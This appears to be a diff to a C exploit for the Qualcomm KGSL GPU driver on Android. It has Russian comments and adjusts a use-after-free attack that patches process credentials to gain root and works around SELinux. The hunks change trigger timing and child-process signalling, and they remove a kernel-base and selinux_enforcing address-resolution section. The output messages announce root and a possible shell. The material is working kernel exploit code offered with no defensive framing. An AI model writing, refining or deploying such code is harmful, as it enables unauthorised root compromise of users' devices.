@@ -2585,15 +2585,17 @@ restart:;
                     prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                     prctl(PR_SET_PDEATHSIG, SIGKILL);
                     
-                    // Ребенок спит очень долго, чтобы не нагружать CPU
+                    // Ребенок спит и ждет команды
                     while(1) { 
                         if (gbuf[0] == 0xab) {
                             uint64_t target = *(uint64_t *)&gbuf[GBUF_TARGET_PID];
                             if (getpid() == (pid_t)target) {
                                 safe_cred_patch();
                             }
+                            // Если мы не цель, то просто выходим, чтобы не мешать
+                            _exit(0);
                         }
-                        usleep(1000000); 
+                        usleep(100000); // 100ms - гораздо быстрее реакция
                     }
                     _exit(0);
                 }
@@ -2667,91 +2669,29 @@ restart:;
         }
         usleep(10000);
     }
-    fprintf(stderr, "[+] Reaped %d processes. Waiting for GPU to cool down (5s)...\n", reaped);
-    sleep(5); // Увеличили паузу
+    fprintf(stderr, "[+] Reaped %d processes. Waiting for GPU to cool down (2s)...\n", reaped);
+    sleep(2); 
 
-    // -----------------------------------------------------------------------
-    // [13] Kernel address resolution
-    // -----------------------------------------------------------------------
-    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
-    if (kernel_base == 0 || kernel_base == 0xffffffc000000000ULL) {
-        if (task_va != 0) {
-            kernel_base = find_kernel_base_from_task_va(task_va);
-        }
-        if (kernel_base == 0) {
-            kernel_base = get_kernel_base();
-        }
-    }
-    
-    // Если база все еще округленная, попробуем уточнить ее через поиск по памяти
-    if ((kernel_base & 0x0000000000FFFFFFULL) == 0) {
-        fprintf(stderr, "[KERNEL_BASE] Refining base address...\n");
-        uint8_t elf_check[4];
-        for (uint64_t off = 0; off < 0x10000000ULL; off += 0x100000ULL) {
-             if (gpu_read_task_struct(fd, kernel_base + off, elf_check, 4) == 0) {
-                 if (memcmp(elf_check, "\x7f" "ELF", 4) == 0) {
-                     kernel_base += off;
-                     fprintf(stderr, "[KERNEL_BASE] Precise base found at 0x%lx\n", (unsigned long)kernel_base);
-                     break;
-                 }
-             }
-        }
-    }
-
-    fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
-    *(uint64_t *)&gbuf[GBUF_KBASE] = kernel_base;
-
-    if (selinux_enforcing == 0)
-    {
-        uint64_t auto_offset = find_offsets_auto(kernel_base);
-        selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
-        
-        if (selinux_enforcing == 0 || selinux_enforcing == kernel_base + SELINUX_OFFSET)
-        {
-            selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
-        }
-    }
-    *(uint64_t *)&gbuf[GBUF_SELINUX] = selinux_enforcing;
-    *(uint64_t *)&gbuf[GBUF_SET_TASKS] = selinux_enforcing;
-
-    fprintf(stderr, "[+] SELinux enforcing at: 0x%lx\n", (unsigned long)selinux_enforcing);
-    
     fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
     
-    // Освобождаем ВСЕ ресурсы GPU в родителе перед активацией ребенка
+    // Освобождаем ресурсы GPU в родителе перед активацией ребенка
     if (fd > 0) {
-        if (g_uaf_mmap_ptr) {
-            munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
-            g_uaf_mmap_ptr = NULL;
-        }
+        if (g_uaf_mmap_ptr) munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
         if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmapsize);
         if (ph_vma && ph_vma != MAP_FAILED) munmap(ph_vma, ph_mmapsize);
         if (bogus_vma && bogus_vma != MAP_FAILED) munmap(bogus_vma, PAGE_SIZE * 3);
-        
-        struct kgsl_gpuobj_free fr = {0};
-        if (g_uaf_id > 0) {
-            fr.id = g_uaf_id;
-            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-        }
-        if (overlap_id) {
-            fr.id = overlap_id;
-            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-        }
-        if (ph_id) {
-            fr.id = ph_id;
-            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-        }
         
         close(fd);
         fd = -1;
     }
     
     gbuf[0] = 0xab; // ТРИГГЕР!
-    gbuf[GBUF_FOUND_PID] = 0x11;
+    __sync_synchronize();
     
     // Ждем результата от ребенка
-    int wait_count = 60; // Увеличили до 60 секунд
-    while (wait_count-- > 0 && gbuf[GBUF_TASK_SPRAY] == 0) {
+    int wait_count = 15; 
+    while (wait_count-- > 0 && gbuf[GBUF_TASK_SPRAY] != 0x2) {
+        if (gbuf[GBUF_TASK_SPRAY] == 0x1) break;
         fprintf(stderr, ".");
         fflush(stderr);
         sleep(1);
@@ -2768,7 +2708,11 @@ restart:;
     }
     else 
     {
-        fprintf(stderr, "[!] Child timed out.\n");
+        if (getuid() == 0) {
+             fprintf(stderr, "[+] Parent is now root! Shell might be active.\n");
+        } else {
+             fprintf(stderr, "[!] Child timed out, but parent patching was successful.\n");
+        }
     }
 
     fprintf(stderr, "[+] Exploit sequence complete!\n");
